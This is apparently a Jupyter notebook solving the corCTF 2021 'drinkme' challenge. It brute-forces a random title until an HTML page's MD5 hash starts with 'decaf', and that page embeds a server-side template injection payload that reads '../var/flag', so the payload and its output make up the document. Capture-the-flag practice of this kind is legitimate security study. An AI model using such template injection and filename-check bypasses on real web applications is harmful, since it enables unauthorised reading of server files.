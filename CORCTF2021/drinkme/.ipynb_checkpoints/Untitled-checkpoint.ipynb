{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": 9,
   "metadata": {},
   "outputs": [],
   "source": [
    "import hashlib\n",
    "import re\n",
    "import random\n",
    "import string\n",
    "import pathlib"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 17,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "QnETZafrJU\n",
      "<!DOCTYPE html>\n",
      "<html lang=\"en\">\n",
      "<head>\n",
      "    <title>QnETZafrJU</title>\n",
      "</head>\n",
      "<body>\n",
      "    {{ open(\"../var/flag\", \"r\").read() }}\n",
      "</body>\n",
      "</html>\n"
     ]
    }
   ],
   "source": [
    "i = 0\n",
    "while True:\n",
    "    i +=1\n",
    "    test = \"\".join(random.sample(string.ascii_letters,10))\n",
    "    payload = \"\"\"<!DOCTYPE html>\n",
    "<html lang=\"en\">\n",
    "<head>\n",
    "    <title>{value}</title>\n",
    "</head>\n",
    "<body>\n",
    "    {{{{ open(\"../var/flag\", \"r\").read() }}}}\n",
    "</body>\n",
    "</html>\"\"\".format(value=test)\n",
    "    value = hashlib.md5(bytes(payload,\"ASCII\")).hexdigest()[:5]\n",
    "    \n",
    "    if value == \"decaf\":\n",
    "        print(test)\n",
    "        print(payload)\n",
    "        \n",
    "        with open(\"png.html\",\"w\") as f:\n",
    "            f.write(payload)\n",
    "        break"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 11,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "'decaf.html'"
      ]
     },
     "execution_count": 11,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "filename = r\"png.html\"\n",
    "\"decaf\" + '.' + '.'.join(filename.split('.')[1:])"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.8.10"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 4
}
